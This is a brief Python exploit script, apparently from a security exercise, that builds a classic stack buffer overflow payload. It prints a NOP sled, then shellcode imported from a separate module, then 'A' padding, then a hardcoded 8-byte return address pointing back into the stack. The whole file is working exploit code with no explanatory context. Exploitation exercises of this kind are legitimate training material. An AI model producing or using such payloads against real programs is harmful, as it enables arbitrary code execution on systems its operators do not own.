#!/usr/bin/env python3

import sys

from shellcode import shellcode

# sys.stdout.buffer.write(b'A'*202)

for i in range(0, 768):
    sys.stdout.buffer.write(b'\x90')
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*202)
sys.stdout.buffer.write(b'A'*8)
sys.stdout.buffer.write(0x7ffffff6df80.to_bytes(8, 'little'))


